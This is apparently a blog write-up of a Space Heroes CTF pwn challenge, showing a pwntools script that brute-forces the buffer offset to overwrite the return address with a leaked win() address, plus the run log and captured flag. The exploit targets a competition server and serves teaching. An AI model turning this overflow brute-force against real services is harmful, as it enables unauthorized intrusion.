---
title: "shctf/pwn: Warmup to the Dark Side"
date: 2022-04-05 15:57:40
categories:
- ctfs
- shctf
- pwn
tags:
- pwn
- buffer-overflow
description: "Learn how to stack smash an ASLR-enabled program... without the binary! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Warmup to the Dark Side\"."
permalink: ctfs/shctf/pwn/warmup-to-the-dark-side/
thumbnail: /asset/banner/banner-darkside.png
---

<style>
    .box {
        border: 1px solid rgba(100, 100, 100, .5);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<div class="box">
    Once you start down the dark path, forever will it dominate your destiny.<br>
    (And yes, the binary isn't included)<br>
    <code>nc 0.cloud.chals.io 30096</code><br>
    <b>Author</b>: v10l3nt
</div>

Let's run that `netcat` link to see what's going on:

```console
$ nc 0.cloud.chals.io 30096
The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c
Jedi Mind tricks dont work on me >>> 
```

We're given an address of the `win()` function... and that's it. If this is a `ret2win` challenge, how are we meant to find the offset of the `$rip` register and overflow it with our code? Of course... we need to brute force it.

In the code snippet below, I got the address provided in the prompt by reading the line and taking its substring (ASLR is enabled, so it's different each time). Then, I slowly increase the buffer of the payload with a loop until I find the right offset of the `$rip`:

```py
from pwn import *
for i in range(32,128):
        p = remote("0.cloud.chals.io", 30096)
        address = p.readlineS()[112:126]
        log.info("Trying offset " + str(i) + " for address " + address)
        p.sendline(b'A'*i + p64(int(address, base=16)))
        output = p.recvallS()
        if "shctf" in output:
                log.success(output)
                break
        p.close()
```

Let's run this script on the server to see if we can get the flag:

```text
...
[*] Trying offset 37 for address 0x55f788f1120c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 38 for address 0x5631d523620c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 39 for address 0x55980d2d520c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 40 for address 0x55f0008b520c
[+] Receiving all data: Done (95B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Jedi Mind tricks dont work on me >>> 
    shctf{I_will_remov3_th3s3_restraints_and_leave_the_c3ll}
```

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
